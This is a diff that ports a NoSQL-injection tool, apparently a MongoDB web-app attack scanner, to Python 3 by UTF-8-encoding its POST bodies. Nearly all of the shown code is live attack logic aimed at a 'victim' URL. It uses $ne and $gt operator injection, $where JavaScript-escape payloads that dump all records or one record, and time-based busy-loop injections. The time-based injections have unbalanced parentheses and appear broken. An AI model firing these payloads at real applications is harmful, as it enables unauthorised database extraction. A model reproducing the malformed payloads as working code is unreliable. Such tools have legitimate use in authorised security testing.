@@ -21,7 +21,7 @@ if version_info >= (2, 7, 9):
 
 
 def save_to(savePath, vulnAddrs, possAddrs, strTbAttack,intTbAttack):
-    fo = open(savePath, "wb")
+    fo = open(savePath, "w")
     fo.write ("Vulnerable URLs:\n")
     fo.write("\n".join(vulnAddrs))
     fo.write("\n\n")
@@ -423,7 +423,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         appURL = "https://" + str(victim) + ":" + str(webPort) + str(uri)
 
     try:
-        body = urllib.parse.urlencode(postData)
+        body = urllib.parse.urlencode(postData).encode('utf-8')
         req = urllib.request.Request(appURL,body, requestHeaders)
         appRespCode = urllib.request.urlopen(req).getcode()
 
@@ -497,7 +497,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         else:
             print("Sending random parameter value...")
 
-        body = urllib.parse.urlencode(postData)
+        body = urllib.parse.urlencode(postData).encode('utf-8')
         req = urllib.request.Request(appURL,body, requestHeaders)
         randLength = int(len(getResponseBodyHandlingErrors(req)))
         print("Got response length of " + str(randLength) + ".")
@@ -513,7 +513,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         neDict = postData
         neDict[injOpt + "[$ne]"] = neDict[injOpt]
         del neDict[injOpt]
-        body = urllib.parse.urlencode(neDict)
+        body = urllib.parse.urlencode(neDict).encode('utf-8')
         req = urllib.request.Request(appURL,body, requestHeaders)
         if verb == "ON":
             print("Testing Mongo PHP not equals associative array injection using " + str(postData) +"...")
@@ -540,7 +540,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         gtDict.update({injOpt:""})
         gtDict[injOpt + "[$gt]"] = gtDict[injOpt]
         del gtDict[injOpt]
-        body = urllib.parse.urlencode(gtDict)
+        body = urllib.parse.urlencode(gtDict).encode('utf-8')
         req = urllib.request.Request(appURL,body, requestHeaders)
         if verb == "ON":
             print("Testing PHP/ExpressJS >Undefined Injection using " + str(postData) + "...")
@@ -556,7 +556,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
             testNum += 1
 
         postData.update({injOpt:"a'; return db.a.find(); var dummy='!"})
-        body = urllib.parse.urlencode(postData)
+        body = urllib.parse.urlencode(postData).encode('utf-8')
         req = urllib.request.Request(appURL,body, requestHeaders)
         if verb == "ON":
             print("Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n")
@@ -577,7 +577,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         print("\n")
 
         postData.update({injOpt:"1; return db.a.find(); var dummy=1"})
-        body = urllib.parse.urlencode(postData)
+        body = urllib.parse.urlencode(postData).encode('utf-8')
         req = urllib.request.Request(appURL,body, requestHeaders)
         if verb == "ON":
             print("Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n")
@@ -597,7 +597,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
 
         # Start a single record attack in case the app expects only one record back
         postData.update({injOpt:"a'; return db.a.findOne(); var dummy='!"})
-        body = urllib.parse.urlencode(postData)
+        body = urllib.parse.urlencode(postData).encode('utf-8')
         req = urllib.request.Request(appURL,body, requestHeaders)
         if verb == "ON":
             print("Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n")
@@ -618,7 +618,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         print("\n")
 
         postData.update({injOpt:"1; return db.a.findOne(); var dummy=1"})
-        body = urllib.parse.urlencode(postData)
+        body = urllib.parse.urlencode(postData).encode('utf-8')
         req = urllib.request.Request(appURL,body, requestHeaders)
         if verb == "ON":
             print("Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n")
@@ -639,7 +639,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         print("\n")
 
         postData.update({injOpt:"a'; return this.a != '" + injectString + "'; var dummy='!"})
-        body = urllib.parse.urlencode(postData)
+        body = urllib.parse.urlencode(postData).encode('utf-8')
         req = urllib.request.Request(appURL,body, requestHeaders)
 
         if verb == "ON":
@@ -660,7 +660,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
             testNum += 1
 
         postData.update({injOpt:"1; return this.a != '" + injectString + "'; var dummy=1"})
-        body = urllib.parse.urlencode(postData)
+        body = urllib.parse.urlencode(postData).encode('utf-8')
         req = urllib.request.Request(appURL,body, requestHeaders)
 
         if verb == "ON":
@@ -687,7 +687,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
         if doTimeAttack == "y" or doTimeAttack == "Y":
             print("Starting Javascript string escape time based injection...")
             postData.update({injOpt:"a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(curDate.getTime()-date.getTime()/1000 < 10); return true; var dummy='a"})
-            body = urllib.parse.urlencode(postData)
+            body = urllib.parse.urlencode(postData).encode('utf-8')
             conn = urllib.request.urlopen(req,body)
             start = time.time()
             page = conn.read()
@@ -708,7 +708,7 @@ def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None)
             print("Starting Javascript integer escape time based injection...")
 
             postData.update({injOpt:"1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()/1000 < 10); return; var dummy=1"})
-            body = urllib.parse.urlencode(postData)
+            body = urllib.parse.urlencode(postData).encode('utf-8')
             start = time.time()
             conn = urllib.request.urlopen(req,body)
             page = conn.read()
